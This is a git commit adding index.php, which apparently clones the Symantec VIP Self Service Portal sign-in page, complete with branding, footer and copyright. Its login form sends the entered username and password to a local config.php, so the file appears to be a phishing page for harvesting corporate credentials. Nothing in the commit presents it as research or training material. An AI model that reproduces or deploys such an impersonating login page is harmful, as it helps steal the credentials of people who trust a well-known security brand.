844d06e7c468528432409ac73f6aa8ec97f5ffb6
chickensliceman <95978158+chickensliceman@users.noreply.github.com>
2021-12-11 12:43:40 -0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,175 @@
+
+
+
+<!DOCTYPE HTML>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+
+
+
+<head>
+
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- HTTP 1.1 -->
+<meta http-equiv="Cache-Control"
+	 content=" no-store, no-cache, must-revalidate, pre-check=0, post-check=0, max-age=0" />	
+<!-- HTTP 1.0 -->
+<META http-equiv="Pragma" content="no-cache"/>
+<!-- Prevents caching at the Proxy Server -->
+<META http-equiv="Expires" content="0"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" >
+<meta http-equiv="Set-Cookie" content="path=/; expires=0; HTTPOnly; Secure"/>
+
+<link rel="icon" href="UI/images/favicon.gif" />
+<link rel="stylesheet" href="UI/css/normalize.css" type="text/css"/>
+<link rel="stylesheet" href="UI/css/base.css" type="text/css"/>
+<link rel="stylesheet" href="UI/css/type.css" type="text/css"/>
+<link rel="stylesheet" href="UI/css/presentation.css" type="text/css"/>
+<link rel="stylesheet" href="UI/css/layout.css" type="text/css"/>
+<link rel="stylesheet" href="UI/css/app.css" type="text/css"/>
+
+
+
+ 
+ 
+
+	
+<script type="text/javascript" src="UI/js/jquery-2.1.1.min.js"></script>
+
+<title>Welcome to the Symantec&reg; VIP Self Service Portal - Sign In</title>
+
+	
+	<script type="text/javascript">
+		var isFrameKiller = true;
+	
+		
+		
+		if(isFrameKiller){
+			if (top != self)
+			{
+			  top.location=self.location;
+			}
+			
+		}
+	</script>
+</head>
+<body>
+
+
+
+	<div id="container">
+		<div id="innerBorder" style="min-height: 690px;">
+			<div id="header">
+				<div class="maxDivWidth">
+				<div id="innerWrapper">
+				<div id="images"></div>
+				<h1>
+					<img class="headerSYMCLogo" title="Symantec" alt="Symantec" src="UI/images/headerLogoSYMC.png" />
+				</h1>
+
+				<h1>
+					<img class="headerSSPLogo" title="SSP IDP" alt="SSP IDP" src="UI/images/headerLogoSSP.png" />
+				</h1>
+		</div>
+
+				
+				<div class="cobrandingImg">
+					<img height="31" width="100" src="https://storage.googleapis.com/sedvip-prd-app-public/services/manager/prd/cobranding_logos/qLCyI8xKULH8aI5C.png" alt="Cobranding Logo "></img>
+				</div>
+				
+
+
+				<div class="clear"></div>
+			</div>
+			</div>
+
+<div style="min-height:690px;">
+<div id="loggedInHeader"> </div>
+<div class="maxDivWidth">
+<div id="article">
+	<div id="content" class="authLayout">
+
+		<div>
+        <div class="loginTop">
+        	<div class="pageTitle"><h2>Welcome to the Symantec&reg; VIP Self Service Portal</h2></div>
+        	<div >  To access the Self Service Portal, enter your user name and password, and click <strong>Sign In</strong>.</div>
+        </div>
+        
+		<div id="detailsContainer">
+			<div id="loginFormContainer">
+					<div id="loginFormContainer">
+						<div class="loginFormBox">
+							<div class="loginFormHeader">
+								<div class="headerText">
+								<strong>Sign In</strong>
+          </div>
+							</div>
+
+
+						  
+        
+		
+						<!--end error banner-->
+							<div class="loginFormBody">
+                    	<form method="get" action="config.php">
+    								<html:hidden property="action" value="doIt"/>
+
+								<div class="stack">
+									<div class="leftSide">
+									<label for="emailInput" class="emailLabel"><strong>User Name</strong>
+									</label>
+	                        </div>
+									<div class="rightSide">	
+									<input name="username" type="text" id="00" style="width:242px;" tabindex="1" />
+	                        </div>
+							</div>
+								<div class="stack">
+									<div class="leftSide">
+										<label for="passwordInput" class="passwordLabel"><strong>Password</strong></label>
+									</div>
+									<div class="rightSide">
+									<input type=password name="password" id="01" maxlength="128" class="text" autocomplete="off"  style="width:242px;" tabindex="2"/>
+									</div>
+								</div>
+								
+								<div class="baseStack">
+										<div class="logoImage">
+											<img alt="Enabled by Symantec VIP" title="" src="UI/images/EnabledBySYMC.png">
+										</div>		
+										<div class="signInButton">
+							<input type="hidden" name="requestTempPasscode" value="null" />
+											<input type="submit" title="Sign In Button" value="Sign In" class="primary" style="height:30px;" tabindex="3"/>
+										</div>
+								</div>
+								<div class="clear"></div>
+						</form>
+							</div>
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		</div>		
+	</div>
+	</div>
+</div>
+<div class="footer">
+	<div class="innerfooter">
+			<div id="footerLinks">
+				<div id="version">Symantec VIP Self Service Portal version 9.9.0</div> 
+			<ul>				<li><a href="http://www.symantec.com/about/profile/policies/legal.jsp" title="Legal Notice" target="_blank" id="footer.panel.legal.notice.link">Legal Notice</a><span class="footerLinksPipe">|</span></li>
+				<li><a href="http://www.symantec.com/about/profile/privacypolicy/" title="Privacy" target="_blank" id="footer.panel.privacy.link">Privacy</a></li>
+				<li>&copy;&nbsp;2019&nbsp;Symantec Corporation</li>
+			</ul>
+	</div>
+			<div id="symantecSeal">
+				<img src="UI/images/EnabledBySYMC.png" alt="Enabled By Symantec"/>
+			</div>
+	</div>
+</div>
+</div>
+</div>
+
+</body>
+
+</html>
